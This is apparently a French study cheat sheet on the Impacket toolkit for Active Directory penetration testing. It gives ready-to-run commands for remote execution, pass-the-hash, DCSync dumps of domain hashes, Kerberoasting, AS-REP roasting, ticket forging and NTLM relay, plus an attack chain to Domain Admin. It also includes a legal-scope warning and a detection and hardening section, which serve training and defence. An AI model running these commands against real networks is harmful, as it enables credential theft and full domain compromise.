# Cheatsheet — Impacket

Suite Python d'outils réseau bas niveau : exécution à distance, dump de secrets, attaques Kerberos, relais NTLM. **La boîte à outils de référence du test interne Active Directory.** Tu l'utilises déjà (`impacket-psexec` sur Netmon) — voici le panorama.

> ⚠️ **Cadre.** Labs et périmètres autorisés uniquement (art. 323-1). Beaucoup de ces outils créent des services, des tâches ou répliquent l'annuaire — bruyants et traçés : à réserver au cadre d'audit.

---

## 1. La syntaxe d'authentification (commune à tous)

Le format de cible est presque toujours le même :

```
[domaine/]utilisateur[:mot_de_passe]@cible
```

| Mode | Options |
| --- | --- |
| Mot de passe | `DOMAINE/user:'P@ssw0rd'@10.0.0.10` |
| **Demander le mot de passe** | `DOMAINE/user@10.0.0.10` (prompt interactif) |
| **Pass-the-Hash** | `-hashes LM:NT` (souvent `:NThash` sans LM) |
| **Kerberos / Pass-the-Ticket** | `-k -no-pass` (utilise `KRB5CCNAME`) |
| Cible par nom | viser le **FQDN** du DC pour Kerberos, pas l'IP |

```bash
# Mot de passe
impacket-wmiexec CORP/jdoe:'Ete2026!'@10.0.0.10

# Pass-the-Hash
impacket-wmiexec -hashes :a9fdfa038c4b75ebc76dc855dd74f0da CORP/jdoe@10.0.0.10

# Pass-the-Ticket (ticket déjà en cache)
export KRB5CCNAME=jdoe.ccache
impacket-wmiexec -k -no-pass CORP/jdoe@dc01.corp.local
```

> Sous Kali, les binaires sont préfixés `impacket-` ; ailleurs on lance les scripts `.py` (`wmiexec.py`, etc.). Même chose.

---

## 2. Exécution de commandes à distance

Une fois **admin local** sur une cible (mot de passe ou hash) :

| Outil | Mécanisme | Discrétion |
| --- | --- | --- |
| `impacket-psexec` | Crée et démarre un **service** (SYSTEM) | Bruyant (Event 7045) |
| `impacket-smbexec` | Service + fichier batch temporaire | Bruyant |
| `impacket-wmiexec` | Via **WMI** (Win32_Process) | **Plus discret** (pas de service) |
| `impacket-atexec` | Via une **tâche planifiée** | Moyen |
| `impacket-dcomexec` | Via DCOM | Moyen |

```bash
impacket-psexec  CORP/administrateur:'Pass'@10.0.0.10     # shell SYSTEM interactif
impacket-wmiexec CORP/administrateur:'Pass'@10.0.0.10     # préféré (semi-interactif)
impacket-atexec  CORP/administrateur:'Pass'@10.0.0.10 "whoami"
```

> Réflexe : `wmiexec` en premier (moins de traces), `psexec` si besoin d'un vrai SYSTEM interactif.

---

## 3. Dump de secrets — secretsdump

Récupère les empreintes de mots de passe (SAM local, secrets LSA, et **NTDS.dit** sur un DC).

```bash
# SAM + LSA d'une machine (admin local requis)
impacket-secretsdump CORP/administrateur:'Pass'@10.0.0.10

# Pass-the-Hash
impacket-secretsdump -hashes :<NThash> CORP/administrateur@10.0.0.10

# DCSync : extraire TOUS les hashes du domaine depuis un DC
#   (nécessite les droits de réplication — Domain Admin ou ACL DS-Replication)
impacket-secretsdump -just-dc CORP/administrateur@dc01.corp.local
impacket-secretsdump -just-dc-ntlm CORP/administrateur@dc01.corp.local   # NT only

# Hors ligne, depuis des fichiers exfiltrés
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Sortie : lignes `user:rid:LM:NT:::` — le **NT hash** part ensuite en Pass-the-Hash ou dans hashcat (mode 1000).

---

## 4. Attaques Kerberos (sans identifiants ou avec un compte lambda)

```bash
# AS-REP roasting : comptes sans pré-authentification Kerberos
#   Récupère un hash cassable hors ligne — parfois SANS identifiants valides
impacket-GetNPUsers CORP/ -no-pass -usersfile users.txt
impacket-GetNPUsers CORP/jdoe:'Pass' -request -format hashcat -outputfile asrep.txt
#   → hashcat -m 18200

# Kerberoasting : tickets de service (SPN) cassables hors ligne
#   Nécessite un compte de domaine valide (n'importe lequel)
impacket-GetUserSPNs CORP/jdoe:'Pass' -dc-ip 10.0.0.10 -request -outputfile spn.txt
#   → hashcat -m 13100
```

Fabrication / abus de tickets (post-compromission) :
```bash
# Silver / Golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain CORP administrateur

# S4U / délégation contrainte
impacket-getST -spn cifs/target CORP/svc:'Pass' -impersonate administrateur
```

---

## 5. Relais NTLM & divers

```bash
# Relais NTLM (couple avec Responder ; cibles sans signature SMB)
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t ldap://dc01 --escalate-user jdoe   # abus LDAP/ADCS

# Client MSSQL (bases SQL Server, fréquentes en interne)
impacket-mssqlclient CORP/svc_sql:'Pass'@10.0.0.10 -windows-auth
#   puis enable_xp_cmdshell pour l'exécution de commandes

# Manipulation de comptes machine (utile pour certaines chaînes AD)
impacket-addcomputer / impacket-rbcd / impacket-changepasswd
```

---

## 6. La chaîne type sur une box AD (ex. Forest / Sauna)

```
1. GetNPUsers  → AS-REP roast d'un compte sans pré-auth   → hash
2. hashcat -m 18200 → mot de passe en clair
3. BloodHound (via ce compte) → repérer un chemin vers Domain Admin
4. GetUserSPNs / abus d'ACL selon le chemin
5. secretsdump -just-dc → dump du domaine (DCSync)
6. psexec/wmiexec avec le hash Administrateur → SYSTEM sur le DC
```

---

## 7. Côté Blue Team — détection

| Outil | Trace clé |
| --- | --- |
| psexec / smbexec | **Event 7045** (service installé), nom aléatoire, Sysmon 1 |
| wmiexec | 4688 + activité WMI (Sysmon 1, parent `WmiPrvSE.exe`) |
| atexec | Création de tâche planifiée (**4698**) |
| secretsdump (DCSync) | **4662** réplication depuis un hôte non-DC ; accès NTDS |
| GetUserSPNs (Kerberoast) | **4769** avec chiffrement **RC4** (0x17) en rafale |
| GetNPUsers (AS-REP) | **4768** pour des comptes sans pré-auth |
| ntlmrelayx | Authentifications NTLM croisées, 4624 type 3 incohérents |

**Durcissement** : signature SMB/LDAP obligatoire, désactiver LLMNR/NBT-NS, **pré-authentification Kerberos** partout, comptes de service en **gMSA** (mots de passe longs → Kerberoast inutile), tiering + LAPS (casse le PtH latéral), restreindre les droits de réplication (anti-DCSync).

---

## 8. À savoir expliquer à l'oral

- **Pourquoi wmiexec plutôt que psexec ?** psexec crée un service (Event 7045 bruyant) ; wmiexec passe par WMI, sans service — plus discret.
- **DCSync en une phrase** : on se fait passer pour un contrôleur de domaine et on demande la réplication des secrets ; d'où `secretsdump -just-dc`. Remédiation : restreindre les droits de réplication.
- **AS-REP vs Kerberoasting** : AS-REP vise les comptes **sans pré-auth** (parfois sans identifiants) ; Kerberoasting vise les **comptes de service (SPN)** et exige un compte valide. Les deux donnent un hash cassable **hors ligne**.
- **Pass-the-Hash avec Impacket** : `-hashes :NT` — on s'authentifie avec l'empreinte, sans jamais connaître le mot de passe.
